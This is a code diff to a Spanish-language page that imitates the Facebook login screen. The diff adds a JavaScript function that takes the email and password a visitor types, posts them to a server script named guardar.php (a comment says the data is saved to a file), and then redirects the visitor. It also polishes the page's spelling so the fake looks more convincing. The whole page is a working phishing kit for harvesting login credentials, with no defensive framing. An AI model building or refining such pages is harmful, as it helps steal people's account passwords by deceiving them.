@@ -19,21 +19,49 @@
             <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
         <div class="container-form">
-            <form action="guardar.php" method="post" id="myForm" class="form">
-                <input type="text" id="email" name="email" placeholder="Correo electronico o numero de telefono">
+            <form id="myForm" class="form">
+                <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono">
                 <input type="password" id="password" name="password" placeholder="Contraseña">
-                <input type="submit" value="Iniciar Sesión">
+                <input type="button" value="Iniciar Sesión" onclick="guardarDatos()">
                 <span><a href="#">¿Olvidaste tu contraseña?</a></span>
                 <div class="border"></div>
                 <button><a href="#">Crear cuenta nueva</a></button>
             </form>
             <p class="create-page">
-                <a href="#">Crear una pagina</a> para una celebridad , una marca o un neogocio.
+                <a href="#">Crear una página</a> para una celebridad, una marca o un negocio.
             </p>
         </div>
     </div>
 
+    <script>
+        function guardarDatos() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
 
+            // Verificar que se hayan ingresado datos
+            if (email === "" || password === "") {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+
+            var data = "email=" + email + "&password=" + password;
+
+            // Simulación de una solicitud AJAX para guardar los datos en un archivo
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "guardar.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        location.href = "index.html"; // Redirigir a otra página si es necesario.
+                    } else {
+                        alert("Algo salió mal, inténtelo de nuevo.");
+                    }
+                }
+            };
+            xhr.send(data);
+        }
+    </script>
 </body>
 
 </html>
